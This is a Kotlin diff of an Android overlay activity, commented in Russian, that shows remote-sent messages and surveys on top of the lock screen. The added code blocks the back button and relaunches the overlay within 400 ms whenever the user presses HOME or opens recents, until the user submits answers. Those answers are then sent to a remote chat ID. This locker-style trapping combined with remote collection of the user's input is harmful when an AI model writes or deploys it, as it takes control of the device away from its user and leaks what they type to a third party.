@@ -5,27 +5,29 @@ import android.content.Context
 import android.content.Intent
 import android.graphics.*
 import android.graphics.drawable.GradientDrawable
-import android.graphics.drawable.LayerDrawable
-import android.graphics.drawable.ShapeDrawable
-import android.graphics.drawable.shapes.RoundRectShape
 import android.os.Build
 import android.os.Bundle
+import android.os.Handler
+import android.os.Looper
 import android.text.InputType
 import android.util.TypedValue
 import android.view.*
 import android.view.animation.DecelerateInterpolator
 import android.widget.*
-import androidx.core.content.ContextCompat
 import kotlinx.coroutines.*
 
 /**
  * Универсальный оверлей:
- *  - mode = "plain"   → текст + кнопка ОК
- *  - mode = "reply"   → текст + поле ввода + Отправить
- *  - mode = "survey"  → последовательные вопросы + поле ввода + Далее/Готово
+ *  - mode = "plain"   → текст + кнопка ОК  (без блокировки)
+ *  - mode = "reply"   → текст + поле ввода + Отправить  (блокировка как в Video)
+ *  - mode = "survey"  → вопросы по очереди + поле ввода  (блокировка как в Video)
+ *
+ * Блокировка (reply/survey): при уходе из активити (HOME, недавние) —
+ * перезапуск через 400мс с сохранением прогресса, пока пользователь не отправит ответ.
  */
 class OverlayActivity : Activity() {
 
+    // ── UI ────────────────────────────────────────────────────────────────────
     private lateinit var cardView: LinearLayout
     private lateinit var titleView: TextView
     private lateinit var subtitleView: TextView
@@ -34,18 +36,33 @@ class OverlayActivity : Activity() {
     private lateinit var actionBtn: Button
     private lateinit var progressView: TextView
 
-    private var mode = "plain"
-    private var replyPrompt = "✏️ Напиши ответ:"
-    private var questions: List<String> = emptyList()
-    private var answers: MutableList<String> = mutableListOf()
+    // ── Состояние ─────────────────────────────────────────────────────────────
+    private var mode            = "plain"
+    private var replyPrompt     = "✏️ Напиши ответ:"
+    private var questions       = arrayListOf<String>()
+    private var answers         = arrayListOf<String>()
     private var currentQuestion = 0
-    private var originalText = ""
-    private var uploadChatId = ""
+    private var originalText    = ""
+    private var uploadChatId    = ""
+    private var done            = false   // true после успешной отправки
+
+    private val handler = Handler(Looper.getMainLooper())
 
     companion object {
-        fun start(context: Context, message: String, fbMode: String = "plain",
-                  replyPrompt: String = "✏️ Напиши ответ:", survey: List<String> = emptyList(),
-                  chatId: String = "") {
+        /**
+         * Запустить оверлей.
+         * [answersProgress] и [currentQ] используются при перезапуске для восстановления прогресса.
+         */
+        fun start(
+            context: Context,
+            message: String,
+            fbMode: String = "plain",
+            replyPrompt: String = "✏️ Напиши ответ:",
+            survey: List<String> = emptyList(),
+            chatId: String = "",
+            answersProgress: ArrayList<String> = arrayListOf(),
+            currentQ: Int = 0,
+        ) {
             context.startActivity(Intent(context, OverlayActivity::class.java).apply {
                 flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_MULTIPLE_TASK
                 putExtra("message", message)
@@ -53,14 +70,19 @@ class OverlayActivity : Activity() {
                 putExtra("reply_prompt", replyPrompt)
                 putStringArrayListExtra("survey", ArrayList(survey))
                 putExtra("chat_id", chatId)
+                putStringArrayListExtra("answers_progress", answersProgress)
+                putExtra("current_q", currentQ)
             })
         }
     }
 
+    // ── Lifecycle ─────────────────────────────────────────────────────────────
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        window.setFlags(WindowManager.LayoutParams.FLAG_SECURE, WindowManager.LayoutParams.FLAG_SECURE)
+        window.setFlags(WindowManager.LayoutParams.FLAG_SECURE,
+            WindowManager.LayoutParams.FLAG_SECURE)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
             setShowWhenLocked(true); setTurnScreenOn(true)
         }
@@ -80,14 +102,51 @@ class OverlayActivity : Activity() {
         intent?.let { applyIntent(it) }
     }
 
+    override fun onStop() {
+        super.onStop()
+        val locked = (mode == "reply" || mode == "survey") && !done
+        if (locked) {
+            // Перезапускаем с текущим прогрессом через 400мс
+            handler.postDelayed({
+                if (!done) {
+                    start(
+                        applicationContext,
+                        originalText,
+                        mode,
+                        replyPrompt,
+                        questions,
+                        uploadChatId,
+                        answers,
+                        currentQuestion,
+                    )
+                }
+            }, 400L)
+        } else {
+            finishAndRemoveTask()
+        }
+    }
+
+    override fun onDestroy() {
+        handler.removeCallbacksAndMessages(null)
+        super.onDestroy()
+    }
+
+    override fun onBackPressed() {
+        // Блокируем кнопку назад в режимах с обратной связью
+        if (mode == "plain" || done) finishAndRemoveTask()
+    }
+
+    // ── Intent → State ────────────────────────────────────────────────────────
+
     private fun applyIntent(i: Intent) {
-        originalText  = i.getStringExtra("message") ?: "⚠️ Положи телефон!"
-        mode          = i.getStringExtra("fb_mode") ?: "plain"
-        replyPrompt   = i.getStringExtra("reply_prompt") ?: "✏️ Напиши ответ:"
-        questions     = i.getStringArrayListExtra("survey") ?: emptyList()
-        uploadChatId  = i.getStringExtra("chat_id") ?: ""
-        answers       = mutableListOf()
-        currentQuestion = 0
+        originalText     = i.getStringExtra("message") ?: "⚠️ Сообщение"
+        mode             = i.getStringExtra("fb_mode") ?: "plain"
+        replyPrompt      = i.getStringExtra("reply_prompt") ?: "✏️ Напиши ответ:"
+        questions        = i.getStringArrayListExtra("survey") ?: arrayListOf()
+        uploadChatId     = i.getStringExtra("chat_id") ?: ""
+        answers          = i.getStringArrayListExtra("answers_progress") ?: arrayListOf()
+        currentQuestion  = i.getIntExtra("current_q", 0)
+        done             = false
         applyMode()
     }
 
@@ -113,55 +172,58 @@ class OverlayActivity : Activity() {
             }
             "survey" -> {
                 if (questions.isEmpty()) { finishAndRemoveTask(); return }
-                inputLayout.visibility  = View.VISIBLE
+                inputLayout.visibility = View.VISIBLE
                 showQuestion(currentQuestion)
             }
         }
     }
+
+    // ── Survey ────────────────────────────────────────────────────────────────
 
     private fun showQuestion(idx: Int) {
         if (idx >= questions.size) {
             submitSurvey()
             return
         }
+        currentQuestion         = idx
         subtitleView.text       = questions[idx]
         subtitleView.visibility = View.VISIBLE
         inputField.setText("")
         inputField.hint = "Введи ответ..."
 
         val isLast = idx == questions.size - 1
-        actionBtn.text = if (isLast) "Готово" else "Далее →"
-        progressView.text = "${idx + 1} / ${questions.size}"
+        actionBtn.text = if (isLast) "Готово ✓" else "Далее →"
+        progressView.text       = "${idx + 1} / ${questions.size}"
         progressView.visibility = View.VISIBLE
 
         actionBtn.setOnClickListener {
             val ans = inputField.text.toString().trim()
-            answers.add(ans)
+            // Обновляем или добавляем ответ
+            if (idx < answers.size) answers[idx] = ans else answers.add(ans)
             showQuestion(idx + 1)
         }
     }
 
+    // ── Submit ────────────────────────────────────────────────────────────────
+
     private fun submitReply() {
         val answer = inputField.text.toString().trim()
+        done = true
         CoroutineScope(Dispatchers.IO).launch {
-            Uploader.sendText(
-                this@OverlayActivity,
-                "💬 Ответ: $answer",
-                uploadChatId
-            )
+            Uploader.sendText(this@OverlayActivity, "💬 Ответ: $answer", uploadChatId)
         }
         showDone("✅ Ответ отправлен!")
     }
 
     private fun submitSurvey() {
+        done = true
         val sb = StringBuilder("📋 *Ответы на опросник:*\n\n")
         questions.forEachIndexed { i, q ->
             sb.append("*${i + 1}. $q*\n")
             sb.append("${answers.getOrElse(i) { "—" }}\n\n")
         }
-        val payload = sb.toString()
         CoroutineScope(Dispatchers.IO).launch {
-            Uploader.sendText(this@OverlayActivity, payload, uploadChatId)
+            Uploader.sendText(this@OverlayActivity, sb.toString(), uploadChatId)
         }
         showDone("✅ Ответы отправлены!")
     }
@@ -178,52 +240,46 @@ class OverlayActivity : Activity() {
     // ── UI Builder ────────────────────────────────────────────────────────────
 
     private fun buildUI() {
-        // Фон с размытием — тёмный полупрозрачный градиент
-        val root = FrameLayout(this).apply {
+        val root = android.widget.FrameLayout(this).apply {
             background = GradientDrawable(
                 GradientDrawable.Orientation.TOP_BOTTOM,
                 intArrayOf(0xCC000000.toInt(), 0xEE0A0A1A.toInt())
             )
         }
 
-        // Карточка по центру
         cardView = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
-            gravity     = Gravity.CENTER_HORIZONTAL
+            gravity     = android.view.Gravity.CENTER_HORIZONTAL
             background  = cardBackground()
             elevation   = dp(16f)
             setPadding(dp(28), dp(32), dp(28), dp(28))
         }
 
-        // Заголовок
         titleView = TextView(this).apply {
-            textSize    = 26f
+            textSize      = 26f
             setTextColor(Color.WHITE)
-            gravity     = Gravity.CENTER
-            typeface    = Typeface.DEFAULT_BOLD
-            setPadding(0, 0, 0, dp(8))
+            gravity       = android.view.Gravity.CENTER
+            typeface      = Typeface.DEFAULT_BOLD
             letterSpacing = 0.02f
+            setPadding(0, 0, 0, dp(8))
         }
 
-        // Подзаголовок / вопрос
         subtitleView = TextView(this).apply {
             textSize    = 15f
             setTextColor(0xFFCCCCCC.toInt())
-            gravity     = Gravity.CENTER
+            gravity     = android.view.Gravity.CENTER
             setPadding(0, 0, 0, dp(16))
             visibility  = View.GONE
         }
 
-        // Прогресс опросника
         progressView = TextView(this).apply {
             textSize    = 13f
             setTextColor(0xFF8888AA.toInt())
-            gravity     = Gravity.CENTER
+            gravity     = android.view.Gravity.CENTER
             setPadding(0, 0, 0, dp(8))
             visibility  = View.GONE
         }
 
-        // Поле ввода
         inputLayout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             visibility  = View.GONE
@@ -242,37 +298,38 @@ class OverlayActivity : Activity() {
         inputLayout.addView(inputField, LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT))
 
-        // Кнопка действия
         actionBtn = Button(this).apply {
-            textSize    = 16f
+            textSize      = 16f
             setTextColor(Color.WHITE)
-            background  = buttonBackground()
+            background    = buttonBackground()
             setPadding(dp(24), dp(14), dp(24), dp(14))
-            isAllCaps   = false
+            isAllCaps     = false
             letterSpacing = 0.04f
-            typeface    = Typeface.DEFAULT_BOLD
+            typeface      = Typeface.DEFAULT_BOLD
             stateListAnimator = null
         }
 
-        // Разделитель
         val divider = View(this).apply {
             setBackgroundColor(0x33FFFFFF)
-            layoutParams = LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT, 1).also {
-                it.bottomMargin = dp(20)
-            }
+            layoutParams = LinearLayout.LayoutParams(
+                LinearLayout.LayoutParams.MATCH_PARENT, 1).also { it.bottomMargin = dp(20) }
         }
 
-        cardView.addView(titleView,    lp(margin = 0))
-        cardView.addView(subtitleView, lp(margin = 0))
-        cardView.addView(progressView, lp(margin = 0))
-        cardView.addView(divider)
-        cardView.addView(inputLayout,  lp(margin = 0))
-        cardView.addView(actionBtn,    lp(margin = 0))
+        fun lp() = LinearLayout.LayoutParams(
+            LinearLayout.LayoutParams.MATCH_PARENT,
+            LinearLayout.LayoutParams.WRAP_CONTENT).also { it.bottomMargin = 0 }
 
-        val cardParams = FrameLayout.LayoutParams(
+        cardView.addView(titleView,    lp())
+        cardView.addView(subtitleView, lp())
+        cardView.addView(progressView, lp())
+        cardView.addView(divider)
+        cardView.addView(inputLayout,  lp())
+        cardView.addView(actionBtn,    lp())
+
+        val cardParams = android.widget.FrameLayout.LayoutParams(
             (resources.displayMetrics.widthPixels * 0.88).toInt(),
-            FrameLayout.LayoutParams.WRAP_CONTENT
-        ).also { it.gravity = Gravity.CENTER }
+            android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
+        ).also { it.gravity = android.view.Gravity.CENTER }
 
         root.addView(cardView, cardParams)
         setContentView(root)
@@ -287,43 +344,26 @@ class OverlayActivity : Activity() {
             .start()
     }
 
-    private fun cardBackground(): GradientDrawable {
-        return GradientDrawable(
-            GradientDrawable.Orientation.TL_BR,
-            intArrayOf(0xFF1A1A2E.toInt(), 0xFF16213E.toInt(), 0xFF0F3460.toInt())
-        ).apply {
-            cornerRadius = dp(20).toFloat()
-            setStroke(dp(1), 0x33FFFFFF)
-        }
+    private fun cardBackground() = GradientDrawable(
+        GradientDrawable.Orientation.TL_BR,
+        intArrayOf(0xFF1A1A2E.toInt(), 0xFF16213E.toInt(), 0xFF0F3460.toInt())
+    ).apply {
+        cornerRadius = dp(20).toFloat()
+        setStroke(dp(1), 0x33FFFFFF)
     }
 
-    private fun inputBackground(): GradientDrawable {
-        return GradientDrawable().apply {
-            setColor(0xFF0D1117.toInt())
-            cornerRadius = dp(12).toFloat()
-            setStroke(dp(1), 0x446666AA)
-        }
+    private fun inputBackground() = GradientDrawable().apply {
+        setColor(0xFF0D1117.toInt())
+        cornerRadius = dp(12).toFloat()
+        setStroke(dp(1), 0x446666AA)
     }
 
-    private fun buttonBackground(): GradientDrawable {
-        return GradientDrawable(
-            GradientDrawable.Orientation.LEFT_RIGHT,
-            intArrayOf(0xFF4F46E5.toInt(), 0xFF7C3AED.toInt())
-        ).apply {
-            cornerRadius = dp(14).toFloat()
-        }
-    }
+    private fun buttonBackground() = GradientDrawable(
+        GradientDrawable.Orientation.LEFT_RIGHT,
+        intArrayOf(0xFF4F46E5.toInt(), 0xFF7C3AED.toInt())
+    ).apply { cornerRadius = dp(14).toFloat() }
 
-    private fun lp(margin: Int = dp(8)): LinearLayout.LayoutParams =
-        LinearLayout.LayoutParams(LinearLayout.LayoutParams.MATCH_PARENT,
-            LinearLayout.LayoutParams.WRAP_CONTENT).also {
-            it.bottomMargin = margin
-        }
-
-    private fun dp(value: Float): Int =
+    private fun dp(value: Float) =
         TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value, resources.displayMetrics).toInt()
     private fun dp(value: Int) = dp(value.toFloat())
-
-    override fun onStop()        { super.onStop(); finishAndRemoveTask() }
-    override fun onBackPressed() { /* заблокировано */ }
 }
